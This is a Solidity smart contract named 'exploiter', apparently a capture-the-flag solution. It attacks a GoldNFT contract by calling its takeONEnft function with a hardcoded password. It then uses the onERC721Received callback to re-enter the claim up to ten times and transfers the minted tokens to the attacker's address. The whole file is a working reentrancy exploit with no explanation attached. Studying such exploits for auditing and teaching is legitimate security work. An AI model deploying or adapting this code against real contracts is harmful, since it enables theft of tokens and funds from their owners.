// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./GoldNFT.sol";

contract exploiter {
    uint256 claims;
    GoldNFT NFT_contract;
    bytes32 password = 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe;
    uint256 target_claims = 10;
    address owner;
    uint256[] public tokenIds;

    constructor(address target_addr)
    {
        owner = msg.sender;
        claims = 0; 
        NFT_contract = GoldNFT(target_addr);
    }

    function attack() payable public
    {
        NFT_contract.takeONEnft(password);

        for (uint256 i = 0; i < target_claims; i++)
        {
            NFT_contract.transferFrom(address(this), owner, tokenIds[i]);
        }
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4)
    {
        tokenIds.push(tokenId);
        if (claims < target_claims)
        {
            claims += 1;
            NFT_contract.takeONEnft(password);
        }

        return this.onERC721Received.selector;
    }
}